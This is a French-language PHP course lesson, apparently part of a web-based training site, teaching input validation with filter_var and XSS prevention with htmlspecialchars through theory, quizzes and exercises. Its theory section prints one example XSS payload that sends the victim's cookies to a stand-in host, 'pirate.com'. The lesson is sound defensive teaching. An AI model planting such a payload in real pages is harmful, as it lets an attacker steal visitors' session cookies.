<body>
<script>
var DAY = {
  num: 13,
  title: "Valider et sécuriser les entrées",
  subtitle: "htmlspecialchars, filter_var : les gardiens de ton site.",
  theory: `
<h3>1. La menace : l'injection HTML/JS (XSS)</h3>
<p>Que se passe-t-il si un visiteur tape ceci dans ton champ « prénom » ?</p>
<pre class="pseudo">&lt;script&gt;document.location='http://pirate.com?vol='+document.cookie&lt;/script&gt;   // du code JS malveillant tapé dans un champ : il redirige la victime et vole ses cookies</pre>
<p>Si ton PHP fait <code>echo $prenom;</code> sans précaution, ce SCRIPT est renvoyé tel quel dans la page… et le navigateur de la victime L'EXÉCUTE (par exemple pour voler ses cookies de session). C'est l'attaque <strong>XSS</strong> (Cross-Site Scripting) : l'une des plus répandues du web. Un <strong>cookie</strong> est une petite donnée que le navigateur garde pour un site (leçon 14).</p>

<h3>2. Le bouclier : htmlspecialchars</h3>
<pre class="pseudo">echo htmlspecialchars($prenom);   // affiche le prénom en NEUTRALISANT tout code HTML/JS qu'il contiendrait
// les &lt; &gt; &amp; " deviennent des ENTITÉS (&amp;lt; …) : le code est AFFICHÉ comme texte, jamais exécuté</pre>
<div class="warn">Règle absolue : TOUTE donnée d'origine utilisateur qui repart vers le HTML passe par <code>htmlspecialchars()</code>. Sans exception, même « ton propre » champ nom. C'est le réflexe n°1 de la sécurité web.</div>

<h3>3. Valider les formats : filter_var</h3>
<pre class="pseudo">filter_var($email, FILTER_VALIDATE_EMAIL)   // renvoie l'email si le format est valide, sinon FALSE
filter_var($age, FILTER_VALIDATE_INT)       // renvoie l'entier si c'est bien un entier, sinon FALSE
filter_var($url, FILTER_VALIDATE_URL)       // renvoie l'URL si le format est valide, sinon FALSE

if (filter_var($email, FILTER_VALIDATE_EMAIL) === false) {   // === false : test STRICT de l'échec (email non valide)
    $erreurs[] = "Email invalide";                           // on ajoute un message au tableau des erreurs
}                                                            // fin du if</pre>
<p>Fini le bricolage <code>strpos("@")</code> de la leçon 4 : <code>filter_var</code> connaît les VRAIES règles des formats (des dizaines de cas), là où un test maison laisse passer des valeurs invalides.</p>

<h3>4. La stratégie de validation complète</h3>
<pre class="pseudo">$erreurs = [];                                   // tableau vide qui COLLECTE toutes les erreurs
$nom = trim($_POST["nom"] ?? "");                // récupère le nom, ?? "" si absent, trim retire les espaces
$email = trim($_POST["email"] ?? "");            // récupère et nettoie l'email
$age = filter_var($_POST["age"] ?? "", FILTER_VALIDATE_INT);   // valide l'âge comme entier (false si invalide)

if ($nom === "") { $erreurs[] = "Nom obligatoire"; }               // champ vide ? → erreur collectée
if (strlen($nom) &gt; 50) { $erreurs[] = "Nom trop long"; }          // trop long ? → erreur collectée
if (filter_var($email, FILTER_VALIDATE_EMAIL) === false) { $erreurs[] = "Email invalide"; }   // format email ?
if ($age === false || $age &lt; 12 || $age &gt; 120) { $erreurs[] = "Âge invalide"; }  // format entier OU hors de 12..120 ?

if (count($erreurs) === 0) {                     // aucune erreur collectée ?
    // traiter (enregistrer, envoyer…)           // → tout est valide : on peut agir
} else {                                         // sinon : au moins une erreur
    foreach ($erreurs as $e) { echo "&lt;p&gt;" . htmlspecialchars($e) . "&lt;/p&gt;"; }  // affiche chaque erreur, échappée !
}                                                // fin du if/else</pre>
<div class="tip">Le tableau <code>$erreurs</code> collecte TOUS les problèmes avant d'afficher : l'utilisateur corrige tout en une seule fois — ergonomie ET rigueur. C'est un accumulateur d'erreurs (le motif de la leçon 6, appliqué à la validation).</div>

<h3>5. Valider ≠ échapper : les deux temps</h3>
<pre class="pseudo">ENTRÉE  (arrivée)   → VALIDER : rejeter ce qui est faux (filter_var, encadrements)         // à la réception
SORTIE  (affichage) → ÉCHAPPER : neutraliser ce qui s'affiche (htmlspecialchars)          // au moment de l'echo</pre>
<p>Deux moments, deux outils, aucun ne remplace l'autre. Un email « valide » peut contenir des caractères à échapper ; un texte inoffensif aujourd'hui peut être ré-affiché ailleurs demain. On valide à l'entrée, on échappe à la sortie.</p>`,
  exercises: [
    { type: "qcm", q: "Une attaque XSS consiste à…", opts: ["Prendre le contrôle du serveur en exploitant une faille système", "Injecter du HTML/JS via un champ, qui s'EXÉCUTE dans le navigateur des victimes", "Deviner le mot de passe par force brute pour usurper un compte", "Inonder le serveur de requêtes jusqu'à le rendre indisponible"], a: 1, exp: "Le site renvoie le poison ; le navigateur des autres l'avale." },
    { type: "qcm", q: "Que fait htmlspecialchars(\"&lt;b&gt;hey&lt;/b&gt;\") ?", opts: ["Interprète les balises et affiche « hey » en gras dans la page", "Convertit < > & \" en entités (&amp;lt; …) : le HTML devient du TEXTE inoffensif", "Retire les balises et n'affiche que le mot « hey » sans mise en forme", "Laisse le navigateur exécuter le HTML tel quel, balises comprises"], a: 1, exp: "Neutralisé : le navigateur AFFICHE les balises au lieu de les interpréter." },
    { type: "qcm", q: "Quand appliquer htmlspecialchars ?", opts: ["À la réception des données", "À CHAQUE affichage (echo) de données d'origine utilisateur", "Une seule fois, au moment d'enregistrer la donnée en base", "Jamais sur ses propres formulaires"], a: 1, exp: "L'échappement se fait en SORTIE : au moment précis où la donnée rejoint le HTML." },
    { type: "qcm", q: "filter_var($email, FILTER_VALIDATE_EMAIL) retourne, si l'email est invalide…", opts: ["\"\"", "false — à tester avec === (le piège du 0 et des chaînes falsy !)", "null", "-1"], a: 1, exp: "Toujours === false : la leçon 3 protège aussi la sécurité." },
    { type: "qcm", q: "Pourquoi filter_var plutôt que notre strpos(\"@\") de la leçon 4 ?", opts: ["Parce que filter_var vérifie en plus que le domaine existe sur Internet", "Il applique les VRAIES règles du format email (des dizaines de cas) : le bricolage laisse passer des invalides", "Parce que strpos() est déprécié et n'existe plus en PHP moderne", "Aucune, les deux repèrent exactement les mêmes emails invalides"], a: 1, exp: "\"a@b\" passait notre bricolage ; filter_var le refuse." },
    { type: "qcm", q: "FILTER_VALIDATE_INT sur \"15abc\" retourne…", opts: ["15", "false : la chaîne ENTIÈRE doit être un entier — plus strict que (int) qui aurait donné 15", "\"15abc\"", "0"], a: 1, exp: "Valider (refuser) ≠ caster (convertir de force) : deux intentions différentes." },
    { type: "qcm", q: "Le tableau $erreurs sert à…", opts: ["Planter au premier problème", "COLLECTER toutes les erreurs pour les afficher ensemble : l'utilisateur corrige tout d'un coup", "Comptabiliser le nombre de tentatives de connexion échouées", "Enregistrer les erreurs dans un fichier journal côté serveur"], a: 1, exp: "Un accumulateur (jour 12) d'erreurs : rigueur + ergonomie." },
    { type: "qcm", q: "count($erreurs) === 0 signifie…", opts: ["Une erreur interne a interrompu la validation des champs", "Toutes les validations sont passées : on peut traiter", "Le formulaire doit être renvoyé car des champs restent invalides", "La session de l'utilisateur a expiré pendant la saisie"], a: 1, exp: "Le feu vert : la porte du traitement." },
    { type: "qcm", q: "Valider et échapper :", opts: ["Ce sont deux mots pour désigner la même opération de nettoyage", "VALIDER à l'entrée (rejeter le faux), ÉCHAPPER à la sortie (neutraliser l'affichage) : deux temps, deux outils", "Échapper à la sortie suffit, valider l'entrée est superflu", "Valider l'entrée suffit, échapper la sortie est superflu"], a: 1, exp: "Le duo indissociable de la sécurité web." },
    { type: "qcm", q: "Pourquoi échapper MÊME un email déjà validé ?", opts: ["Un email validé est déjà propre : le réafficher tel quel est sans risque", "Un email VALIDE peut contenir des caractères spéciaux ('+', quotes dans certains formats) : valide ≠ inoffensif à l'affichage", "Parce qu'un email est toujours une donnée hostile par nature", "Parce que htmlspecialchars accélère l'affichage de la page"], a: 1, exp: "Chaque défense couvre un angle différent." },
    { type: "qcm", q: "L'attribut HTML maxlength=\"50\" sur le champ nom rend-il inutile le test strlen côté PHP ?", opts: ["Oui, l'attribut maxlength bloque déjà toute saisie trop longue", "NON : le navigateur se contourne en 5 secondes — seul le serveur fait foi (leçon 12 !)", "Oui, dès lors que le site est servi en HTTPS", "Oui, les navigateurs récents garantissent cette limite"], a: 1, exp: "La règle d'or : ne jamais faire confiance au client." },
    { type: "qcm", q: "Un pseudo affiché sur un forum public sans échappement. Qui est en danger ?", opts: ["Personne, un pseudo affiché reste inoffensif", "TOUS les visiteurs qui verront la page : le script injecté s'exécute chez chacun", "Seulement l'auteur du message, sur son propre écran", "Uniquement le serveur qui héberge le forum"], a: 1, exp: "C'est ce qui rend le XSS si grave : une injection, des milliers de victimes." },
    { type: "qcm", q: "$age = filter_var($_POST[\"age\"] ?? \"\", FILTER_VALIDATE_INT); if ($age === false || $age < 12) … — pourquoi === false et pas == ?", opts: ["Par simple convention d'écriture, sans effet réel", "age = 0 serait égal (==) à false : un bébé de 0 an passerait pour un « format invalide » — logique brouillée", "Parce que === s'exécute plus vite que ==", "Aucune différence, == et === donnent le même résultat ici"], a: 1, exp: "Le trio infernal 0/false/== une dernière fois : === partout." },
    { type: "qcm", q: "Où placer htmlspecialchars dans : echo \"&lt;p&gt;\" . $nom . \"&lt;/p&gt;\"; ?", opts: ["Autour de toute la chaîne, balises &lt;p&gt; comprises", "Autour de $nom seul : echo \"&lt;p&gt;\" . htmlspecialchars($nom) . \"&lt;/p&gt;\"; — TES balises restent du HTML voulu", "Sur une ligne séparée, juste avant l'instruction echo", "Uniquement sur les balises &lt;p&gt; et &lt;/p&gt;"], a: 1, exp: "On neutralise la DONNÉE, pas le gabarit." },
    { type: "vf", q: "La validation côté serveur est optionnelle si le site a un beau design.", a: false, exp: "Le design n'arrête aucune attaque. Serveur = seule ligne de défense réelle." }
  ],
  final: {
    title: "Exercice final — L'inscription blindée",
    intro: `<p>Le formulaire d'inscription du club, version sécurisée. Un attaquant envoie : nom = <code>&lt;script&gt;alert('gotcha')&lt;/script&gt;</code>, email = <code>pas-un-email</code>, age = <code>\"7\"</code>.</p>
<pre class="pseudo">$erreurs = [];                                        // collecteur d'erreurs (tableau vide)
$nom = trim($_POST["nom"] ?? "");                     // récupère et nettoie le nom
$email = trim($_POST["email"] ?? "");                 // récupère et nettoie l'email
$age = filter_var($_POST["age"] ?? "", FILTER_VALIDATE_INT);   // valide l'âge comme entier (false sinon)

if ($nom === "" || strlen($nom) > 50) { $erreurs[] = "Nom invalide"; }   // nom vide OU trop long ?
if (filter_var($email, FILTER_VALIDATE_EMAIL) === false) { $erreurs[] = "Email invalide"; }   // format email ?
if ($age === false || $age < 12 || $age > 120) { $erreurs[] = "Âge : entre 12 et 120"; }   // entier ET dans 12..120 ?

if (count($erreurs) === 0) {                          // aucune erreur ?
    echo "Bienvenue " . htmlspecialchars($nom);       // OK : on affiche le nom ÉCHAPPÉ (anti-XSS)
} else {                                              // sinon : au moins une erreur
    foreach ($erreurs as $e) { echo htmlspecialchars($e) . "&lt;br&gt;"; }   // affiche chaque erreur, échappée
}                                                     // fin du if/else</pre>`,
    questions: [
      { type: "qcm", q: "Le nom-script de l'attaquant passe-t-il la validation « nom » ?", opts: ["Non, la validation détecte et rejette le script", "OUI : non-vide et < 50 caractères — la VALIDATION ne suffit pas, c'est l'ÉCHAPPEMENT qui le neutralisera", "Non, PHP lève une erreur en voyant la balise script", "Non, le serveur refuse la requête et se bloque"], a: 1, exp: "Démonstration parfaite des deux temps : valider laisse passer ce script court." },
      { type: "input", q: "Combien d'erreurs collecte $erreurs pour cet envoi ? (email ET âge)", a: "2", ph: "nombre", exp: "Email invalide + âge 7 < 12 : deux entrées dans le collecteur." },
      { type: "qcm", q: "Si l'attaquant corrige email et âge, que devient son nom-script à l'affichage ?", opts: ["Le script s'exécute !", "htmlspecialchars l'affiche comme TEXTE : « Bienvenue &lt;script&gt;… » visible mais inerte", "htmlspecialchars le retire complètement de l'affichage", "L'affichage déclenche une erreur PHP fatale"], a: 1, exp: "Le bouclier de sortie fait son travail : gotcha raté." },
      { type: "qcm", q: "age = \"7\" : quel test l'a arrêté ?", opts: ["Le test $age === false, car filter_var aurait refusé « 7 »", "$age < 12 : filter_var a validé l'entier 7, c'est l'ENCADREMENT métier qui refuse", "Un contrôle de longueur via strlen sur la valeur", "Le trim() qui aurait vidé la valeur avant le test"], a: 1, exp: "Format valide ≠ valeur acceptable : deux couches de validation." },
      { type: "qcm", q: "Pourquoi échapper MÊME les messages d'erreur ($e) ?", opts: ["Un message d'erreur est écrit par nous : il ne contient jamais de donnée à échapper", "Discipline : si demain un message inclut une donnée utilisateur, il est déjà protégé — l'échappement systématique ne se discute pas", "Parce que les messages d'erreur sont dangereux en eux-mêmes", "Pour uniformiser la présentation des messages"], a: 1, exp: "La sécurité est une habitude, pas une exception." }
    ],
    solution: `<pre class="pseudo">Envoi hostile :                                    // ce que l'attaquant a envoyé
nom   = &lt;script&gt;…        → validation OK (!) → neutralisé à l'echo   // valide mais rendu inerte par htmlspecialchars
email = pas-un-email      → erreur collectée        // format email invalide
age   = 7                 → int valide mais &lt; 12 → erreur collectée   // trop jeune

Défense en profondeur :                            // les 4 couches empilées
1. ?? et trim         (existence, propreté)        // champ présent et nettoyé
2. filter_var         (formats)                    // email/entier valides
3. encadrements       (règles métier)              // âge entre 12 et 120
4. htmlspecialchars   (sortie neutralisée)</pre>
<p>Quatre couches, zéro confiance : ton formulaire est de niveau professionnel. Demain : reconnaître le visiteur d'une page à l'autre — sessions et cookies.</p>`
  }
};
</script>
<script src="engine.js"></script>
<script>
var ECRITURE = {
  placeholder: "Écris ton code PHP ici…",
  items: [
  { id: "php-formulaire", title: "Le formulaire de contact", level: 3,
    statement: "Écris une page avec un formulaire <strong>POST</strong> (nom + message). À la soumission, la même page valide que les deux champs sont remplis, puis affiche le message de façon <strong>sécurisée</strong> (protection XSS).",
    hints: [
      "Détecte la soumission avec : if ($_SERVER[\"REQUEST_METHOD\"] === \"POST\").",
      "Valide avec empty() sur $_POST[\"nom\"] et $_POST[\"message\"] ; trim() d'abord pour refuser les espaces seuls.",
      "JAMAIS d'echo direct d'une saisie utilisateur : passe-la par htmlspecialchars()."
    ],
    solution: "<?php                                        // ouvre la zone PHP\nif ($_SERVER[\"REQUEST_METHOD\"] === \"POST\") { // vrai UNIQUEMENT si le formulaire a été soumis\n    $nom = trim($_POST[\"nom\"] ?? \"\");        // ?? \"\" : chaîne vide si la clé n'existe pas ; trim retire les espaces\n    $message = trim($_POST[\"message\"] ?? \"\"); // idem pour le message\n\n    if (empty($nom) || empty($message)) {    // un des deux champs est vide ?\n        echo \"<p>Erreur : tous les champs sont obligatoires.</p>\"; // on refuse\n    } else {                                 // les deux champs sont remplis\n        $nomSecur = htmlspecialchars($nom);  // neutralise le HTML malveillant (anti-XSS)\n        $msgSecur = htmlspecialchars($message); // idem pour le message\n        echo \"<p><strong>$nomSecur</strong> a écrit : $msgSecur</p>\"; // affichage sécurisé\n    }                                        // fin de la validation\n}                                            // fin du traitement POST\n?>\n<form method=\"post\">                         <!-- method=post : les données partent dans $_POST -->\n    <input type=\"text\" name=\"nom\" placeholder=\"Ton nom\">          <!-- name devient la clé dans $_POST -->\n    <textarea name=\"message\" placeholder=\"Ton message\"></textarea> <!-- zone de texte multiligne -->\n    <button type=\"submit\">Envoyer</button>   <!-- déclenche l'envoi du formulaire -->\n</form>",
    atoi: { cmd: "php script.php", expected: "<form method=\"post\">                         <!-- method=post : les données partent dans $_POST -->\n    <input type=\"text\" name=\"nom\" placeholder=\"Ton nom\">          <!-- name devient la clé dans $_POST -->\n    <textarea name=\"message\" placeholder=\"Ton message\"></textarea> <!-- zone de texte multiligne -->\n    <button type=\"submit\">Envoyer</button>   <!-- déclenche l'envoi du formulaire -->\n</form>" },
    checklist: ["Détecter la soumission avec $_SERVER[\"REQUEST_METHOD\"] === \"POST\" avant tout traitement", "Appliquer trim() puis empty() sur nom ET message pour refuser les champs vides ou faits d'espaces", "Passer chaque saisie par htmlspecialchars() avant l'echo, jamais d'affichage brut", "Laisser le <form method=\"post\"> affiché en dessous pour permettre un nouvel envoi"],
    note: "htmlspecialchars transforme les balises malveillantes en texte inoffensif : c'est LA défense anti-XSS." }
  ]
};
</script>
